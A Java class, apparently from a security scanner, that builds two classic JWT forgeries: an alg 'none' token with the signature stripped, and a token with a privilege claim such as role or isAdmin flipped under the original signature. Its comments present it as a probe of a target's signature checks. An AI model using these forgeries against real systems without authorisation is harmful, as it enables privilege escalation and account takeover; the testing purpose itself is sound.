package com.sentinelops.service.logic;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;

/**
 * Pure (no I/O) JWT inspection and tampering for AUTH-11. Builds the two classic forgeries so the caller
 * can send them to the target's own probe endpoint and see whether they are honoured — never claims a
 * finding itself, since that depends on the server's response.
 */
public final class JwtTool {
    private JwtTool() {}

    private static final ObjectMapper JSON = new ObjectMapper();
    private static final Base64.Decoder DEC = Base64.getUrlDecoder();
    private static final Base64.Encoder ENC = Base64.getUrlEncoder().withoutPadding();

    /** A handful of claim names worth flipping; enough to prove the server isn't checking the signature. */
    private static final List<String> PRIVILEGE_CLAIMS = List.of("role", "isAdmin", "is_admin", "admin", "scope", "permissions");

    public static boolean looksLikeJwt(String token) {
        if (token == null) return false;
        String[] parts = token.split("\\.", -1);
        if (parts.length != 3 || parts[0].isEmpty() || parts[1].isEmpty()) return false;
        try {
            JsonNode header = JSON.readTree(DEC.decode(pad(parts[0])));
            JsonNode payload = JSON.readTree(DEC.decode(pad(parts[1])));
            return header.has("alg") && payload.isObject();
        } catch (Exception ex) {
            return false;
        }
    }

    /** "header.payload." with alg rewritten to "none" and the signature dropped. */
    public static String toAlgNone(String token) {
        String[] parts = token.split("\\.", -1);
        ObjectNode header;
        try {
            header = (ObjectNode) JSON.readTree(DEC.decode(pad(parts[0])));
        } catch (Exception ex) {
            throw new IllegalArgumentException("Not a JWT", ex);
        }
        header.put("alg", "none");
        String newHeader = ENC.encodeToString(header.toString().getBytes(StandardCharsets.UTF_8));
        return newHeader + "." + parts[1] + ".";
    }

    public record TamperResult(String token, String claimChanged) {}

    /**
     * Flips the first recognisable privilege claim it finds and re-encodes the payload, keeping the
     * ORIGINAL header and signature untouched. If the target still accepts this token, its signature
     * check is broken (the bytes no longer match what was signed) — that is the finding, not the claim
     * value itself. Returns null when no such claim is present.
     */
    public static TamperResult tamperPrivilegeClaim(String token) {
        String[] parts = token.split("\\.", -1);
        ObjectNode payload;
        try {
            payload = (ObjectNode) JSON.readTree(DEC.decode(pad(parts[1])));
        } catch (Exception ex) {
            return null;
        }
        for (String claim : PRIVILEGE_CLAIMS) {
            if (!payload.has(claim)) continue;
            JsonNode v = payload.get(claim);
            if (v.isBoolean()) {
                payload.put(claim, !v.asBoolean());
            } else if (v.isTextual()) {
                String low = v.asText().toLowerCase();
                payload.put(claim, low.contains("admin") ? "user" : "admin");
            } else {
                continue; // not a shape we know how to flip meaningfully
            }
            String newPayload = ENC.encodeToString(payload.toString().getBytes(StandardCharsets.UTF_8));
            return new TamperResult(parts[0] + "." + newPayload + "." + parts[2], claim);
        }
        return null;
    }

    private static String pad(String b64url) {
        return b64url; // java.util.Base64 URL decoder in this JDK tolerates missing padding
    }
}
